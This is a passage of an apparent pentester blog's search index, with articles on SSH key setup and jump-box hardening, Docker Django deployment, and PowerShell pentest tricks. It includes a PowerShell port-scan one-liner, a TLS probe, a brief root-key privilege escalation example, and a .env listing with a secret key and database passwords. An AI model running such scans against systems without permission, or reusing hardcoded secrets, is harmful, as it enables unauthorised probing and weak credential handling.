on the demo2 machine.First though let us see one more use of the ssh-keygen command. Remember that SHA1 fingerprint from earlier. System Preferences.So buy running ssh-keygen -l -v -f and pointing it as either the public or private key we can confirm that the fingerprint show matches the one generated. MD5 is not recommended these days due to potential collisions however if you need to test fingerprints as MD5 you can use the following&amp;num; get the MD5 for private keyopenssl pkey -in /path/to/privatekey -pubout -outform DER | openssl md5 -c&amp;num; get the MD5 for public keyopenssl pkey -in /path/to/publickey -pubin -pubout -outform DER | openssl md5 -Copying Keys To Another ServerFirst I want to clarify some common mistakes. I know of other consultants who have thought they could use the following command to add the keys to another server. System Preferences.Okay there is a lot happening in this picture and I want to break some of it down.Firstly I have changed directory to the root of the server cd / to show you do not need to be in the same folder as the keys to use this command. Secondly we can see the servers current fingerprint just like we did with the first server. Notice the server fingerprint is not the same and any fingerprints we have generated or seen so far. If we look further down we can see that the first time I had to manually authenticate to the sever and then we can see that the number of key(s) copied were “Number of key(s) added: 1”.Let us have a look what is going on. Please note I have already SSH to the box so no fingerprint for me to accept in this screenshot. System Preferences.Now let us examine the .ssh folder System Preferences. not keys have been copied across as the name in the command might suggest. the public key on demo1 has been added into the authorized_keys on demo2 but the id_rsa private key and id_rsa.pub key were not transferred. Once an SSH key has been created, the ssh-copy-id command can be used to install it as an authorized key on the server. Once the key has been authorized for SSH, it grants access to the server without a password. That’s its function.So know we have seen that the function of ssh-copy-id and how it does it job there should be little reason to worry about placing keys and authorized file entries into golden build images. You spin the server and then the admin (demo1) in this situation uses the ssh-copy-id.Let us look at an alternative, up comes box 3.The admin has a new machine deployed on his network. For the sake of simplicity, we have called it “demo3”. System Preferences.With server 3 booted the admin on host “demo1” wants to be able to SSH into demo3. We know that the admins public key hosted on demo one needs to be placed inside the authorized keys of demo3.Just for excitement as so you keep learning something new as you read. Let us not use the ssh-copy-id command.cat id_rsa.pub | ssh root@95.179.138.81 'cat &gt; ~/.ssh/authorized_keys'cat ~/.ssh/id_rsa.pub | ssh root@95.179.138.81 'cat &gt;&gt; ~/.ssh/authorized_keys'Two things should be noted. This time we do need to be in the directory of the SSH Public key folder or we need to put in an explicit path as in example two. The aim here is to to cat the public key and pipe it to the authorized keys.We have two problems, however! 1) We don’t even know if this file exists yet which will result in an error. Secondly, it may be exist and have keys already in it that we don’t want to overwrite with a single “&gt;” symbol.If we just want SSH to run a command and return we can list it as the end of the ssh command.ssh root@95.179.138.81 'ls -Rl ~/' System Preferences.As we can see, the root folder is pretty empty and so out command would result in error unless we made a directory first. Now we have started this was we will continue but I just wanted to highligh some of the extra steps the ssh-copy-id command takes care of such as create the folders, files and getting the permissions right. However lets proceed.Lets make the folder using the -p that creates any directories needed along the way. System Preferences.Now lets copy the public key across. System Preferences.So with the public key copied across, albeit a lot more work we should be in a position to SSH into that server without a password. It should be noted at this point we have a reasonably secure configuration with “demo1” being able to access “demo2” and “demo3”.It should be noted that “demo3” could still connect back to “demo1” with a password. Not this might be behavior that is needed but if “demo1” is a jump box to other machines in the network we may want to harden “demo1” by adjust the config.Password authentication defaults to “yes”, don’t want to lock yourself out of a box by accident now do we. Note, even though the field is not set and commented out it shows us the default behavior. System Preferences.Now before I change around with config and potentially lock myself out of my admin jump box “demo1” I need to remember two things. Firstly I need the private key to log in. This can be grabbed from the local system by using the scp command.scp root@demo1:/root/.ssh/*I will get asked for my password but I will have my precious keys. However I STILL wont be able to login. The more observant of you by this point should be screaming your authorized_key file is missing. System Preferences.We can run the ssh-copy-id on localhost but notice we still need to log in.With that complete, we can edit the ssh configuration to stop password login from other boxes. This helps secure our jump box.nano /etc/ssh/sshd_config System Preferences.Let us uncomment that line and change it to no. Now Demo2 and Demo3 could not ssh to us without a private key and even if they brute forced the correct password for the root user it would not let them connect. System Preferences.Lets restart the service and try it out.systemctl restart sshd System Preferences.No prompt for a password and a message saying permission denied, something we have all seen on pentests.What is the known hostWhen we press “yes” to accept the fingerprints of servers that we login to their corresponding entries get added to known_hosts. If a server fingerprint changes for any one of a number of reasons and it no longer matches what is in the known host we get a warning next time we try and connect to that server. System Preferences.Lets force one now System Preferences.so despite connecting to that machine multiple times before we know have to once again accept the warning….. System Preferences.When administering a lot of servers from your jump box, pressing yes all the time could end up being quite annoying. Is there another way?Enter sshkey-scanSo lets have a look at this useful tool. I will admit in out three machine setup it is overkill but it does let us look at the options a bit easier. System Preferences.So what is going on here! First, we can see the format of the original known_host file (the one I modified with ‘l33t’).I have then emptied out the known host file due to the fact we are about to fill it. Please note that the known_host file hasnt been filled yet as we still have to redirect out command back into the the file. Before we get that far lets have a look when we don’t give ssh-keyscan a format for the known host file. Each IP I gave it was submitted as ed25519, ssh-rsa, ecdsa, and ed25519. In addition it fingerprints the end server boxes for their IP, ports and their operating system version and leaves it as a comment before each entry. This makes this a rather useful tool.If you have more than the few machines that I have here then you can supply them as a file with the -f option. Note, make sure you include machines you trust and you know haven’t been compromised. Regenerating the known hosts will remote the warning telling you if a host has changed since you last approved it so double check.Lets create out known host file and check it out. System Preferences.so let us run out command and see if we can login with no warning. System Preferences.Now before I finish part one of this article; I do appreciate you staying with me while we go through the some of the configuration of the process. I just want to show you one more thing for the lazy admin… like me!ConfigThe local SSH Config can allow us to do some very complex things. We will only cover some of the really useful features here System Preferences.My “config” file for my jumpbox on demo1Host demo2 HostName 78.141.216.246 User rootHost demo3 HostName 95.179.138.81 User rootNow with just ssh demo2 it replaces ssh root@78.141.216.246 System Preferences.SummaryIn this first article, we looked at some of the SSH commands responsible for deployed Private Key Infrastructure with SSH. We look at a reasonable good practice with regards to making a jump box and got a general understanding of the difference between the config file, the known_hosts file, the authorized_keys and the public and private key.In the second part of this article, we will expand on part one and go deeper into some of the configuration options and how they are often misconfigured to allow lateral movement, and complete network pwnage. I would however feel I miss-sold you on the title of the article if I didn’t show you one basic privilege escalation trick.In the screenshot below the admin has backup his private key to a folder with the wrong permissions. Debbie has come along and found this key and has SSH into the host she is on. Debbie is now the root user and has a stable shell. System Preferences.This trick was a little contrived but comes up frequently in capture the flag events. System Preferences.Try and wrap your head around the basics we talked about today. Next article we will look at SSH Server configuration in detail and the things that often go wrong, we will look at piping tools through SSH, creating tunnels, moving laterally and will talk a lot more about SSH fingerprinting and how it can help us increase the attack surface." }, { "title": "The Many Hats Of A Pentester", "url": "/posts/many-hats-pentester/", "categories": "article", "tags": "soft-skills, pentester", "date": "2021-04-24 00:00:00 +0100", "snippet": "Hat One - TechnicalHat Two - Be able to write wellHat Three - Present to a diverse audience", "content": "Hat One - TechnicalHat Two - Be able to write wellHat Three - Present to a diverse audience" }, { "title": "Covert Voice In A Video To Text", "url": "/posts/covert-voice-video-text/", "categories": "tutorial", "tags": "voice, convert", "date": "2021-04-24 00:00:00 +0100", "snippet": "Have you ever wanted to extract the text from a video file? There are a number of software packages and transcription services flooding the search engines and it can be hard to pick a piece of soft...", "content": "Have you ever wanted to extract the text from a video file? There are a number of software packages and transcription services flooding the search engines and it can be hard to pick a piece of software or a service.As a programmer my preferred choice to this solution was to script something myself using the Google Cloud Speech-to-Text service.This tutorial will demonstrate how to transcribe short video files ( less than 1 minute) using synchronous speech recognition and long audio files (longer than 1 minute) to text using asynchronous speech recognition.We will look at doing this with Python and Curl.Two methods, RPC and REST. RPC takes in binary audio files however REST submits JSON and so we need to convert out file into base64 if we want to send it from out local machine.1. Downloading an API key for the Speech-to-Text serviceFirst we sign up for an Google Cloud Web Services and download an API key for the Speech-to-Text serviceIn order to do this there are a few prerequisites: Set Up a Speech-to-Text Project in the Google Cloud Console. You’ve set up your environment using Application Default Credentials in the Google Cloud Console.2. Creating a Virtual Environment For the purpose of this tutorial we are going to start using the python client libraries however if you don’t wish to install the python libraries then it is possible to use the built in Curl command which will also demonstrate later on in this article as an alternative.With our API key downloaded we need to write some code. Due to the fact that we will be installing python modules we should start off by creating a python virtual environment to keep the libraries contained from interfering with that of the system.cd ~mkdir convertercd converterapt-get install python3-venvIf you get an error creating the environment you may need to install the following packageapt-get install python3-venvWith our virtual environment created we need to activate it.source venv/bin/activate3. Installing the Google Cloud Speech module for PythonWith the environment activated. Install the following python client library.pip install --upgrade google-cloud-speech4. Set an Environmental Variable to point to the API keyNext, place the downloaded API key in the projects directory. You do not need to keep the default name, you can call it anything you want. I have decided to rename mine to config.jsonNext Step, set the environment variable for the config file.export GOOGLE_APPLICATION_CREDENTIALS=\"/home/evilsaint/converter/config.json\"5. Extracting the AudioNext we extract the audio as the visual element is unneeded for the the conversion. Run the following command to covert your file.ffmpeg -i &lt;video-input-file.mp4&gt; &lt;audio-output-file.wav&gt; Before proceeding to the next step it is a good idea to play the audio file (at least in part) to check the audio conversion worked?Assuming you are happy with the playback you can now proceed to the next step.6. Downloading Google Cloud Speech Sample Application CodeDownload the following file.wget https://raw.githubusercontent.com/googleapis/python-speech/master/samples/snippets/transcribe_async.py7. Customise transcribe_async.py for the WAVDue to the fact we are using WAV files we either need to admit the following line or specify 44100.sample_rate_hertz=16000Edit the following lines for the Google Cloud Bucket and the local file functions.nano -l transcribe_async.pyBecause the WAV file I have contains two channels I am going to modify the audio channel config and also the encoding. config = speech.RecognitionConfig( encoding='LINEAR16', sample_rate_hertz=44100, language_code=\"en-US\", audio_channel_count=2, )8. Hosting the File In The Cloud (Optional)One of the easiest ways to host the audio files is to upload them go you Google Cloud Platform (GCP) bucket. You must have proper access permissions to read Google Cloud Storage files, such as one of the following: Publicly readable (such as our sample audio files) Readable by your service account, if using service account authorization. Readable by a user account, if using 3-legged OAuth for user account authorization. 9. Convert The FileNow we can convert our file from the cloudpython transcribe_async.py gs://evilsaint/audio-output.wavOr we can convert the file locally.python transcribe_async.py audio-output.wav Using Curl1. Converting the Audio to a Text FileNext we need to covert our audio file to base64 before we can send it to the “Speech-to-Text” API from the local system. This is not needed if you are sending the file from the GPC bucket.base64 audio-output.wav -w 0 &gt; audio-data.txt2. Constructing the Curl commandMake a request.json filetouch request.jsonEdit the filenano request.jsonInside the file we can do{ \"config\": { \"encoding\":\"LINEAR16\", \"sample_rate_hertz\":\"44100\", \"language_code\":\"en-US\", \"audio_channel_count\":\"2\", }, \"audio\": { \"uri\":\"gs://evilsaint/audio-output.wav\" }}And make a curl command like so446 mv request.json sync-request.json 447 cat sync-request.json 448 curl -s -H “Content-Type: application/json” -H “Authorization: Bearer “$(gcloud auth application-default print-access-token) https://speech.googleapis.com/v1/speech:recognize -d @sync-request.json 449 echo “deb [signed-by=/usr/share/keyrings/cloud.google.gpg] https://packages.cloud.google.com/apt cloud-sdk main” | sudo tee -a /etc/apt/sources.list.d/google-cloud-sdk.list 450 sudo apt-get install apt-transport-https ca-certificates gnupg 451 curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key –keyring /usr/share/keyrings/cloud.google.gpg add - 452 sudo apt-get update &amp;&amp; sudo apt-get install google-cloud-sdk 453 sudo apt-get install google-cloud-sdk-app-engine-java 454 gcloud init 455 gcloud init –skip-diagnostics 456 historycat sync-request.json { \"config\": { \"encoding\":\"LINEAR16\", \"sample_rate_hertz\":\"44100\", \"language_code\":\"en-US\", \"audio_channel_count\":\"2\", }, \"audio\": { \"uri\":\"gs://evilsaint/audio-output.wav\" }}curl -s -H \"Content-Type: application/json\" -H \"Authorization: Bearer \"$(gcloud auth application-default print-access-token) https://speech.googleapis.com/v1/speech:recognize -d @sync-request.json{ “error”: { “code”: 400, “message”: “Sync input too long. For audio longer than 1 min use LongRunningRecognize with a ‘uri’ parameter.”, “status”: “INVALID_ARGUMENT” }}curl -s -H \"Content-Type: application/json\" -H \"Authorization: Bearer \"$(gcloud auth application-default print-access-token) https://speech.googleapis.com/v1/speech:longrunningrecognize -d @sync-request.jsoncurl -s -H \"Content-Type: application/json\" -H \"Authorization: Bearer \"$(gcloud auth application-default print-access-token) https://speech.googleapis.com/v1/speech:longrunningrecognize -d @sync-request.json{ \"name\": \"1211050700785987050\"}Maybecurl -s -H \"Content-Type: application/json\" -H \"Authorization: Bearer \"$(gcloud auth application-default print-access-token) https://speech.googleapis.com/v1/operations/1211050700785987050 " }, { "title": "Beginner Guide To APT Commands", "url": "/posts/beginner-guide-apt-commands/", "categories": "article", "tags": "apt, aptidude", "date": "2021-04-24 00:00:00 +0100", "snippet": "Little history of how apt works?What are sources?Updating sources?Searching for packagesShow information about the packageFinding packages installed on your machineFinding packages that are upgrade...", "content": "Little history of how apt works?What are sources?Updating sources?Searching for packagesShow information about the packageFinding packages installed on your machineFinding packages that are upgradeableautoremove and autoClean" }, { "title": "Moving Around The Terminal Like A Boss: Using Screen For Linux", "url": "/posts/using-screen-for-linux/", "categories": "tutorial", "tags": "", "date": "2021-04-19 00:00:00 +0100", "snippet": "InstallingSetting Namescreen -S &lt;my scans&gt;", "content": "InstallingSetting Namescreen -S &lt;my scans&gt;" }, { "title": "Rename a VMDK disk and associated files with VMware Virtual Disk Manager", "url": "/posts/rename-vmdk-disk-and-associated-files-vmware-virtual-disk-manager/", "categories": "tutorial", "tags": "vmdk, vmware, windows", "date": "2021-04-15 00:00:00 +0100", "snippet": "I have a template Kali Linux Virtual Machine that I keep around in case in case of an unfixable error on my current engagement machine. The filenames inside this folder are quite verbose and are in...", "content": "I have a template Kali Linux Virtual Machine that I keep around in case in case of an unfixable error on my current engagement machine. The filenames inside this folder are quite verbose and are intentional to remind me what platform and version it is come to using the backup. This is fine for keeping backups but due to my OCD, I like to rename my engagement machines. Inside the below explorer window it can look quite daunting seeing all the verbose filenames associated with the machine; many consultants do not attempt to rename their machines in fear of messing them up. After all the machine has many associated files we need to rename. Explorer Windows Showing our Existing Machine.The VMware Virtual Disk Manager is a tool that is included with VMware Workstation. TLDR - What we are about to do is make a new machine with the exact naming convention and filesystem we want. We will then delete its hard disk drive and using the VMware Virtual Disk Manager tool included with VMware Workstation we will rename (and move) the old disk from the template to match. NB - I said we will be renaming and moving the hard disk drive so if you would like to use this baseline in the future then I suggest it is something you keep additional copies of.It is typically installed into the following folder: Explorer window of our old vmware machine with unfriendly name.This folder contains lots of files. Check for the presence of the VMware Disk Manager tools by using a wildcard character following some of the initial prefix e.g. dir vmware* cmd prompt set that the location of 'vmware workstation`.Great so the tools are present. We want to rename our VMware Virtual Machine contained in the following folder. cmd promp with the `dir vmware*` showing all files begining with vmware`.As I do not need the VM Image to function from inside VM Workstation I am going to remove the image. Note this does not delete it from the disk. Explorer title bar navigated to the directory of the machine we are going to be cleaning.Next, I am going to install a new VM in a directory with the desired name in my desired location. New Virtual Machine Wizard.When asked choose “I will install the operating system later.” I will install the operating system later.Set this new VM in your desired location and choose the name you wish for your VM Naming the machine BlackWidow through the New Virtual Machine Wizard.Before finishing I like to customise the machine’s hardware. For this machine, I am going to perform the following New Virtual Machine Wizard - Customise Options. Remove Printer Remove Sound Card Increase memory to 8GB Go to “Display” and select “Accelerate 3d Graphics”. Then change the Graphics memory to 1GB. Under the CPU I will select the following checkboxes. Virutalize Intel VT-x/EPT or AMD-V/RVI Virtualize CPU Performance Counters Virtualize IOMMU (IO memory management unit) With our machine installed our first job is to delete the brand new created virtual disk.Either go to the Settings or press CTRL + D` and remove the hardisk Remove Hardrive from machine settings.Now lets remove the harddrive from the physical disk. Remember the quick way to get to the folder is to right-click on the machine name and select “Open VM directory”. With the folder open we can now see our new VM and all of its files. Open up the Virtual Machine by right clicking on it similar to earlier Open VM Directory of new BlackWidow Machine.Remove the Hard disk, the file ending in vmdk from the folder. VM in workstation. Remove the BlackWidows.vmdk file from explorer.Delete the file from the hard drive Remove the BlackWidows.vmdk file from explorer.Next we use the Virtual Disk Manager to rename the old hardrive and place it in the new location. Using the vmware-vdiskmanager.exe to rename and move old machines vmdk. Note: This will move the hard drive from the original folder. You might want to make a copy.Now all is left is to attach the hard drive.Got to settings CTRL + D and click “Add”. Select Hard Disk. Add Hardware Wizard - Select Hard Disck and Click Next. Add Hardware Wizard - Select Use an existing vitural disk.Choose “Use an existing virtual disk”. Add Hardware Wizard - Select Use an existing vitural disk.Select the disk you just created and click “Finish” Add Hardware Wizard - Browser to newly created BlackWidow.vmdk.You can now delete the old folder that contained your machine Hard Disk and boot your new machine up." }, { "title": "Git with SSH Keys", "url": "/posts/git-ssh-keys/", "categories": "article", "tags": "git, github, github-desktop, source-tree, ssh-keys, x509", "date": "2021-04-15 00:00:00 +0100", "snippet": "When working with Git via command line, the easiest way to authenticate is with x.509 keys. This article will show you how to set them up.IntroductionWith GUI-based Git clients, such as GitHub Desk...", "content": "When working with Git via command line, the easiest way to authenticate is with x.509 keys. This article will show you how to set them up.IntroductionWith GUI-based Git clients, such as GitHub Desktop and SourceTree, authentication is managed by the applications themselves with little to no user input required.However, sometimes you may want to use the power of the command line, in which case it is useful to have SSH keys set up.SSH Key LocationSSH keys are stored at the following locations depending on the operating system and/or the user.On Linux - assuming you are not using the root user ;-)/home/&lt;user&gt;/.ssh orRoot user/root/.sshBoth of these can be shortened using the tilde ~, which is a shortcut for home. You can use tilde with many commands to save you from typing the full path. For example, you could have cd ~ that would take you to your home directory. The two commands mentioned above could be shortened to the following.~/.sshOn Windows, the typical location for SSH keys isC:\\User\\&lt;username&gt;\\.sshListing KeysNow that we have learned where the SSH keys are stored on our system let us look at how we can list the contents of this folder.Linuxls -l ~/.ssh Git with SSH Keys.Windows CMDdir c:\\users\\&lt;username&gt;\\.sshWindows PowerShellGet-ChildItem C:\\Users\\&lt;username&gt;\\.ssh Note It is quite common to have multiple keys in this folder as keys can be used for many things other than Git.Existing SSH keysIf you are learning about SSH keys and using them to authenticate to Git Repositories for the first time, the above folders likely are empty on your system. In this case, please take a look at the screenshots above. You will notice that the keys are named in pairs; one key ends in the .pub extension, and the other has no extension at all.The file ending in .pub contains the public key, while the other file contains the private key. The private key should never be shared anywhere. If you lose your private key, you will need to regenerate a new private/public key pair, as authentication cannot be successfully completed without both parts.It should be noted that you can regenerate a public key with just the private key; however, you cannot generate a new private key from a public key.Generating Your First SSH Key-pairTo generate a brand new key pair, you can use the SSH keygen command ssh-keygen, which is available on most versions of *nix, Mac OS, and Windows with either the Windows Subsystem for Linux (WSL) or the Git Windows Desktop package.Here’s the command you want to usessh-keygen -t rsa -b 4096 -C \"&lt;comment&gt;\"| Option | Description ||————|——————————————|| -t type | The type option states the type of encryption to use. The possible values are “dsa”, “ecdsa” or “rsa”. Please note this is RSA version 2; for RSA version 1, you need to change this to “rsa1”. || -b bits | This option specifies the number of bits in the key to create. For RSA keys, I like to use 4096 bits, the default is 2048, and the minimum is 768 bits. When working with DSA keys, it is important to note that the DSA keys must be exactly 1024 bits. For ECDSA keys, the -b flag determines the key length by selecting from one of three elliptic curve sizes: 256, 384 or 521 bits. Attempting to use bit lengths other than these three values for ECDSA keys will fail. || -C comment | Allows for a comment to be added to the public key | Note The comment field is typically filled in with the key owner’s email address, but it can actually be anything you want it to be. You could enter a random string or a note about the client device or service being used. It is, however, recommended that you do not enter vague or unclear content in this space and instead use something that will allow you to identify the owner/purpose of the keys years down the road.After we have decided on a specific type, bits, and comment text, we are ready to generate our keys. Upon typing the command and hitting enter, the first thing you will be asked is where you would like to store the newly generated keys. Typically, you are advised to store the keys in one of the default locations, which we looked at earlier with the suggested id_ key name. Examples include id_rsa, id_dsa, and id_ecdsa. Personally, I prefer to name my keys with something a little more memorable. If you look at the screenshots above, you will see that I like to use distinctive key names, such as `github_rsa`.Next, you will be asked if you would like to add a passphrase. The purpose of the passphrase is to encrypt your private key. Encrypting the private key makes the file useless in case the key is compromised. It is not unusual for computers to be lost or stolen or for old hardware to be decommissioned without the hard disc being wiped.The passphrase is needed to use the encrypted key. Some less security-conscious users often state not seeing the point of using SSH keys when they will still have to type in their authentication credentials each time, and as a result, will often leave the passphrase blank. This is the wrong way of looking at the purpose of SSH keys. The passphrase acts as a separate factor of authentication. Keep in mind that it is much more difficult to brute-force an SSH key than it is a password; however, on its own, the key may be vulnerable to theft, and so the password is its last line of defence.Adding SSH Keys to GitAs shown in the pictures below, setting up Git to work with SSH keys is a similar process on Github and Gitlab.GitlabFirst, let us look at Gitlab.Click on the profile icon in the top right, and a drop-down menu will appear. Select the menu item “Settings”.Another menu should be located on the left-hand side of the settings page. On it, click on the “SSH Keys” option.You will be presented with an input box to paste your public key (the one that ends in .pub). Paste your key into the input box and give your key a title that will allow you to recall the device or user that will be authenticated. Make sure that this is something you will remember years down the road, as it can be difficult to debug over time if you are left to analyse an ambiguous clue. Finally, you can submit an expiry date which is useful if you have third party developers or contractors working in your repository.GitHubAs we will see, Github follows a similar process to that of adding SSH keys to Gitlab, albeit with an extra step.Click on the profile icon in the top right corner, and a drop-down menu will appear. Select the menu item “Settings”.A menu should be located on the left-hand side of the settings page. Click on the “SSH and GPG Keys” option.At this point of the Gitlab setup, we would be presented with an input field to paste our SSH key into, below which would be a list of all our existing keys. With Github, however, we are presented with a list of our existing keys and a green button that says “New SSH Key”. Click on this button, and you will be presented with an input box similar to that provided on Gitlab.An input box to paste your public key (the one that ends in .pub) will be presented to you. Paste your key into the input box and give your key a title that will allow you to recall the device or user that will be authenticated. Make sure that this is something you will remember years down the road, as it can be difficult to debug over time if you are left to analyse an ambiguous clue. Unlike Gitlab, Github does not allow you to set a key that expires.Using multiple keysAs I mentioned at the beginning of this article, you may have multiple SSH keys on your system. In fact, I prefer to create a new SSH keypair for each service.Why?If a keypair becomes compromised, it is much easier to regenerate one keypair than it is to change it in multiple locations.It is recommended that you use a different SSH key for every service you intend to use. This makes it very easy to invalidate a key on a specific service without having to change it on all the services, should you decide to renew it either because it has been compromised / publicly exposed or for any other reason." }, { "title": "Docker Django Application", "url": "/posts/docker-django-application/", "categories": "tutorial", "tags": "docker, django", "date": "2021-04-15 00:00:00 +0100", "snippet": "ssh-copy-id -n root@192.248.158.136The -n is for a dry run.This will copy the public key allowing us to connect to the server with our private key.ssh-copy-id root@192.248.158.136However we need ou...", "content": "ssh-copy-id -n root@192.248.158.136The -n is for a dry run.This will copy the public key allowing us to connect to the server with our private key.ssh-copy-id root@192.248.158.136However we need our private key on the box to talk to the private github reppo.scp id_rsa root@192.248.158.136:/root/.ssh/Make a directory in the traditional locationmkdir -p /var/wwwPull across blank repogit clone git@github.com:cleverberry/docker-django-evilsaint.com.git /var/www/djangoI am not going to pull across the existing project as I will need to files as I convert this.root@docker-django-evilsaint:~# cd /tmp/root@docker-django-evilsaint:/tmp# git clone git@github.com:cleverberry/django-evilsaint.com:::docker# pull the official base imageFROM python:3.8.3-alpine# set work directoryWORKDIR /usr/src/django-app# set environment variablesENV PYTHONDONTWRITEBYTECODE 1ENV PYTHONUNBUFFERED 1# install dependenciesRUN pip install --upgrade pipCOPY ./requirements.txt .RUN pip install -r requirements.txt# copy projectCOPY . .So, we started with an Alpine-based Docker image for Python 3.8.3. We then set a working directory along with two environment variables: PYTHONDONTWRITEBYTECODE: Prevents Python from writing pyc files to disc (equivalent to python -B option) PYTHONUNBUFFERED: Prevents Python from buffering stdout and stderr (equivalent to python -u option)Next I want to create a directory for me to put my app files into.mkdir /usr/src/django-appcp /tmp/django-evilsaint.com/app /usr/src/django-appLet’s go back to our project root and have a look at what we have.Next, we need to add a docker-compose.yml file to the project root::::python hc 8version: '3.7'services: web: build: ./app command: python manage.py runserver 0.0.0.0:8000 volumes: - ./app/:/usr/src/django-app/ ports: - 8000:8000 env_file: - ./.envWe have created a volume as per the Django app directory we created earlier. This is where we will dump our app source- ./app/:/usr/src/django-app/Next we have specified an environmental file-./.envHere is what I have placed in mineDEBUG=TrueSECRET_KEY=sdiofujsdioaaiWfjRsdTlHjriloarejtiop9dfjuaopjkfiopsdhujZfopieqriarosdXhfpAAsaofkcikoSaSshfgopiswujrfopsdhjiuagTUOphtsudjfiLGHNFohiqeprtghejrfdsDJANGO_ALLOWED_HOSTS=localhost 127.0.0.1 [::1]SQL_ENGINE=django.db.backends.postgresql_psycopg2SQL_DATABASE=the_evilsaint_com_034998jer903203ksldjslSQL_USER=mysaintSQL_PASSWORD=iloveyou_abc123_princess_princessSQL_HOST=localhostSQL_PORT=5432So now we reference these in the settings and fill in some defaultsEdit the settings file inside this pathnano /usr/src/django-app/This will become your database blockDATABASES = { \"default\": { \"ENGINE\": os.environ.get(\"SQL_ENGINE\", \"django.db.backends.sqlite3\"), \"NAME\": os.environ.get(\"SQL_DATABASE\", os.path.join(BASE_DIR, \"db.sqlite3\")), \"USER\": os.environ.get(\"SQL_USER\", \"evilsaint\"), \"PASSWORD\": os.environ.get(\"SQL_PASSWORD\", \"!5_V3ry_53cur3\"), \"HOST\": os.environ.get(\"SQL_HOST\", \"localhost\"), \"PORT\": os.environ.get(\"SQL_PORT\", \"5432\"), }}See how these are used for the remaining variables.Using the psycopg2 package we need to add some dependencies to our docker file.# install psycopg2 dependenciesRUN apk update \\ &amp;&amp; apk add postgresql-dev gcc python3-dev musl-devUpdate Composer With Database, Gunicorn, Nginx" }, { "title": "Auditing Cisco Network Devices", "url": "/posts/auditing-cisco-network-devices/", "categories": "article", "tags": "", "date": "2021-04-15 00:00:00 +0100", "snippet": "Administrative Line Login With No PasswordLook out for device administrative (console and aux) lines that are configured without a password. An attacker with physical access to the ports, or with r...", "content": "Administrative Line Login With No PasswordLook out for device administrative (console and aux) lines that are configured without a password. An attacker with physical access to the ports, or with remote modem access, would be able to access the host. Any access could lead to system compromise, packet sniffing, or denial of service.Ensure that authentication is configured on all ports. Shut down any ports that are not in use.The authentication mechanism and authentication password can be configured on administrative lines using the following line mode commands:login [tacacs | local]password password" }, { "title": "5 Uses for PowerShell on Pentests", "url": "/posts/5-uses-powershell-pentests/", "categories": "article", "tags": "powershell", "date": "2021-04-15 00:00:00 +0100", "snippet": "1, Checking for duplicate filesFinding duplicate files can be a tricky task, especially when you have 100’s of files spread all over your hard drive. An easy way is to compute the checksum of the ...", "content": "1, Checking for duplicate filesFinding duplicate files can be a tricky task, especially when you have 100’s of files spread all over your hard drive. An easy way is to compute the checksum of the files you would like to check and compare them. If we generate checksums for two files, we can declare that the two files aren’t duplicates if the checksums are different. If the checksums are equal, we can claim that the files are identical, considering that getting the same hash for two different files is almost impossible.Collisions can occur with Sha1 and MD5, so it is recommended you either double-check with both algorithms (as a collision on both will be unlikely) or use an algorithm such as Sha512.We can use the following function to get the checksum of any file.Get-FileHash -Algorithm sha1 file.txtThe Get-FileHash algorithm attribute supports the following: SHA1 (160 bits) SHA256 (256 bits) SHA384 (384 bits) SHA512 (512 bits) MACTripleDES (64 bits) MD5 (128 bits) RIPEMD160 (160 bits)2 Create ISO filesWhat are ISO files?ISOs are a type of archive. The easiest way to think of an ISO file is more like a .zip or .cab archive file, only without the compression. An ISO file contains the image of a disk. That means it contains all the files and folders on that disk, much like a .zip or .cab file containing a collection of files and folders.What are some of the benefits of ISO files. Chances of getting viruses in your file are reduced. Chances of your data being corrupt are reduced after creating an ISO file. A single ISO file can hold a whole batch of files and tools.Using the code, we can find it at the following location. We can create an ISO file for storing tools and documents inside and mounting them inside our virtual machines.New-ISOFile functionTo make the script easier to call, we will put it in our profile. See the following link for more information about PowerShell profiles and the appropriate location.https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-7.1#the-profile-filesNew-Item -ItemType Directory $Home\\Documents\\PowerShell\\New-Item $Home\\Documents\\PowerShell\\Profile.ps1notepad $Home\\Documents\\PowerShell\\Profile.ps1With the function saved in our profile, we can now create an ISO. Let us use the text files we created earlier.gci * | New-ISOFile -Path textfile.isoLets now mount the disk and boot up our VMSetting the CD player path to the path of the ISO we just created.The drive has appeared and seems to have content in it.Let’s hit Ctrl + E to open up Explorer and navigate our mounted ISO.Out ISO contains the three files from earlier.3, Using PowerShell to Show Server Response HeadersUsing the Invoke-WebRequest or the valid and shortened iwr, we can retrieve interesting information.The returned object from Invoke-WebRequest will allow you to see items such as the returned HTTP status code, the links on a page, the forms on the page and the returned server headers.$request = Invoke-WebRequest https://evilsaint.co.uk$request.StatusCode$request.Headers$request.RawContent &gt; temp.htmlWhat these Headers mean I will leave for a future article, but here is a useful reference in the mean-time:The HTTP Response Headers ListHere we can see the headers returned by the server when making a GET request to evilsaint.com4, Checking what versions of SSL/TLS the server will support“ssl2”, “ssl3”, “tls”, “tls11”, “tls12” | % { $TcpClient = New-Object Net.Sockets.TcpClient $TcpClient.Connect(\"evilsaint.com\", 443) try { $SslStream = New-Object Net.Security.SslStream $TcpClient.GetStream() $SslStream.ReadTimeout = 15000 $SslStream.WriteTimeout = 15000 $SslStream.AuthenticateAsClient(\"evilsaint.com\",$null,$_,$false) $KeyExhange = $SslStream.KeyExchangeAlgorithm $HashAlgorithm = $SslStream.HashAlgorithm $status = $true } catch { $status = $false } $TcpClient.Dispose() $SslStream.Dispose() Write-Host \"$_ = $status\" #Write-Host $KeyExhange #Write-Host $HashAlgorithm}Here we can see that evilsaint.com does not support SSL version 2 or 35, Alive Hosts And Open Port DetectionWhile ideally, we would always have tools such as Nmap, Masscan and Hping3 to hand, sometimes, we just had to live-of-the-land.To see if a host is alive, we can use Test-NetConnection to send an ICMP ping request.Test-NetConnection evilsaint.comIf we specify a port, then PowerShell will attempt a TCP connect test to that port.Test-NetConnection [evilsaint.com](http://evilsaint.com/) -Port 443With a little scripting, we can use the Net Sockets TCP Client and loop through many ports like so1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect(\"[evilsaint.com](http://evilsaint.com/)\",$*)) \"Port $* is open!\"} 2&gt;$nullThis can be quite a slow process.Here we can see Port 22 has been left open :-)" }, { "title": "Remote Exploit MS17-010", "url": "/posts/remote-exploit-ms17-010/", "categories": "article", "tags": "kali-linux, metasploit, ms17-010, windows", "date": "2021-03-27 00:00:00 +0000", "snippet": "This article demonstrates how to exploit the MS17-010 vulnerability with the Metasploit Framework. This article is for educational purposes only.Two methods are demonstrated; with and 